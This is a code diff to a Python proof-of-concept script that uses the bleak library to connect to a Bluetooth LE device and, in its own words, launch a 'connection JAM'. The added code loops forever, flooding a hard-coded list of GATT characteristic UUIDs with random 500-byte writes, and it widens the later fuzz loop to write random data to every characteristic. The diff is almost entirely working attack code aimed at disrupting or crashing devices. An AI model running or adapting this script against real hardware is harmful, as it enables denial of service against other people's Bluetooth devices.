@@ -1,4 +1,4 @@
-import asyncio, os, argparse
+import asyncio, os, argparse, bleak
 from bleak import BleakClient
 
 
@@ -28,16 +28,31 @@ class POC():
 
                 async with BleakClient(mac) as client:
 
+                    t = False
+
 
                     client.connect()
-
+                    #client.mtu_size = 700
+                    #bleak.backends.characteristic.BleakGATTCharacteristic.max_write_without_response_size = 300
                     if client.is_connected:
 
                         print(f"\n\n[+] Successfully connected to: {mac}")
-                        print("[+] Launching connection JAM!\n"); await client.pair(), client.unpair(), client.disconnect()
+                        print("[+] Launching connection JAM!\n")#; await client.pair(), client.unpair(), client.disconnect()
 
                         services = list(client.services); chars = []
 
+
+                        shit = ['00000001-0000-1001-8001-00805f9b07d0', '00000002-0000-1001-8001-00805f9b07d0', '00002a01-0000-1000-8000-00805f9b34fb', '00002a00-0000-1000-8000-00805f9b34fb', '00002a04-0000-1000-8000-00805f9b34fb', '00002ac9-0000-1000-8000-00805f9b34fb', '00002a05-0000-1000-8000-00805f9b34fb']
+
+                        while True:
+                            for shii in shit:
+                                payload = os.urandom(500)
+                                await client.write_gatt_char(char_specifier=shii, data=payload, response=False)
+                                print(f"Fuzz: {payload.hex()} --> {shii}")
+
+                        
+
+                        if not t: return
 
                         for service in services:
 
@@ -56,17 +71,15 @@ class POC():
 
                                 filler = "write"
                                 
-                                if uuid not in chars and filler in property: chars.append(uuid); loops -= 1
+                                if uuid not in chars: chars.append(uuid); loops -= 1
 
 
-                        
-
-                        # THIS IS
+                        print(chars)
                         while True:
                             for char in chars:
                                 payload = os.urandom(5)
                                 #await client.pair()
-                                await client.write_gatt_char(char_specifier=char, data=payload)
+                                await client.write_gatt_char(char_specifier=char, data=payload, response=True)
                                 
                                 print(f"[+] Fuzz: {payload.hex} --> {mac}")
 
